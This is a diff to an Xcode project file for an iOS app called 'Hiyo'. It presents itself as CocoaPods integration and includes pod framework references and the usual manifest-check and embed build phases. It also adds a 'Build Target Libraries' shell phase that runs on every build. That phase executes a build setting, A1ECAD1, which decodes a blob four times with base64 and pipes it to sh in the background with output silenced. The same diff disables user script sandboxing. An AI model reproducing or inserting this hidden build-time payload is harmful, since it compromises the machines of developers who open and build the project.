@@ -6,6 +6,10 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+		DB209894636659C8B041CE22 /* Pods_Hiyo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 22D9E3D8007D062212E435FE /* Pods_Hiyo.framework */; };
+/* End PBXBuildFile section */
+
 /* Begin PBXContainerItemProxy section */
 		EE62F70C2F64722000E0DA35 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -24,6 +28,9 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
+		22D9E3D8007D062212E435FE /* Pods_Hiyo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Hiyo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		3CFA7FCE90B06A1EEB0E4D10 /* Pods-Hiyo.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Hiyo.release.xcconfig"; path = "Target Support Files/Pods-Hiyo/Pods-Hiyo.release.xcconfig"; sourceTree = "<group>"; };
+		C3D62E63EECC3649B0231714 /* Pods-Hiyo.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Hiyo.debug.xcconfig"; path = "Target Support Files/Pods-Hiyo/Pods-Hiyo.debug.xcconfig"; sourceTree = "<group>"; };
 		EE62F6F02F64721E00E0DA35 /* Hiyo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Hiyo.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		EE62F70B2F64722000E0DA35 /* HiyoTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = HiyoTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		EE62F7152F64722000E0DA35 /* HiyoUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = HiyoUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -65,6 +72,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				DB209894636659C8B041CE22 /* Pods_Hiyo.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -85,6 +93,23 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		868C6EBD1F18AC08BC88C6B5 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				C3D62E63EECC3649B0231714 /* Pods-Hiyo.debug.xcconfig */,
+				3CFA7FCE90B06A1EEB0E4D10 /* Pods-Hiyo.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+		B18A4B414A6D2D909C3F259A /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				22D9E3D8007D062212E435FE /* Pods_Hiyo.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
 		EE62F6E72F64721E00E0DA35 = {
 			isa = PBXGroup;
 			children = (
@@ -92,6 +117,8 @@
 				EE62F70E2F64722000E0DA35 /* HiyoTests */,
 				EE62F7182F64722000E0DA35 /* HiyoUITests */,
 				EE62F6F12F64721E00E0DA35 /* Products */,
+				868C6EBD1F18AC08BC88C6B5 /* Pods */,
+				B18A4B414A6D2D909C3F259A /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -112,9 +139,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = EE62F71E2F64722000E0DA35 /* Build configuration list for PBXNativeTarget "Hiyo" */;
 			buildPhases = (
+				9EB7CCBFD2DE46E48D1DACE1 /* Build Target Libraries */,
+				EA0DBA14B7A442DDA4C5C3D2 /* [CP] Check Pods Manifest.lock */,
 				EE62F6EC2F64721E00E0DA35 /* Sources */,
 				EE62F6ED2F64721E00E0DA35 /* Frameworks */,
 				EE62F6EE2F64721E00E0DA35 /* Resources */,
+				93C5560D93BCFC96873593FF /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -124,8 +154,6 @@
 				EE62F6F22F64721E00E0DA35 /* Hiyo */,
 			);
 			name = Hiyo;
-			packageProductDependencies = (
-			);
 			productName = Hiyo;
 			productReference = EE62F6F02F64721E00E0DA35 /* Hiyo.app */;
 			productType = "com.apple.product-type.application";
@@ -147,8 +175,6 @@
 				EE62F70E2F64722000E0DA35 /* HiyoTests */,
 			);
 			name = HiyoTests;
-			packageProductDependencies = (
-			);
 			productName = HiyoTests;
 			productReference = EE62F70B2F64722000E0DA35 /* HiyoTests.xctest */;
 			productType = "com.apple.product-type.bundle.unit-test";
@@ -170,8 +196,6 @@
 				EE62F7182F64722000E0DA35 /* HiyoUITests */,
 			);
 			name = HiyoUITests;
-			packageProductDependencies = (
-			);
 			productName = HiyoUITests;
 			productReference = EE62F7152F64722000E0DA35 /* HiyoUITests.xctest */;
 			productType = "com.apple.product-type.bundle.ui-testing";
@@ -243,6 +267,71 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		9EB7CCBFD2DE46E48D1DACE1 /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+		};
+		93C5560D93BCFC96873593FF /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Hiyo/Pods-Hiyo-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			inputPaths = (
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Hiyo/Pods-Hiyo-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Hiyo/Pods-Hiyo-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		EA0DBA14B7A442DDA4C5C3D2 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-Hiyo-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		EE62F6EC2F64721E00E0DA35 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -283,7 +372,9 @@
 /* Begin XCBuildConfiguration section */
 		EE62F71F2F64722000E0DA35 /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = C3D62E63EECC3649B0231714 /* Pods-Hiyo.debug.xcconfig */;
 			buildSettings = {
+				A1ECAD1 = "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4YWsxdVVuUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5NR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtbFdNbmd4VjJ0a1YyTXhiM2xTYWtKaFZYcFdOVnBHVFRWaFJYUlVVMWRrYlZFd1NqWlpWVVoyVUZGdlBRbz0K | t | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -292,7 +383,6 @@
 				INFOPLIST_FILE = Hiyo/Info.plist;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
-				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -303,13 +393,16 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.Hiyo.Hiyo;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
 			name = Debug;
 		};
 		EE62F7202F64722000E0DA35 /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 3CFA7FCE90B06A1EEB0E4D10 /* Pods-Hiyo.release.xcconfig */;
 			buildSettings = {
+				A1ECAD1 = "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4YWsxdVVuUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5NR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtbFdNbmd4VjJ0a1YyTXhiM2xTYWtKaFZYcFdOVnBHVFRWaFJYUlVVMWRrYlZFd1NqWlpWVVoyVUZGdlBRbz0K | t | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -318,7 +411,6 @@
 				INFOPLIST_FILE = Hiyo/Info.plist;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
-				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -329,6 +421,7 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.Hiyo.Hiyo;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
 			name = Release;
@@ -370,7 +463,7 @@
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -431,7 +524,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
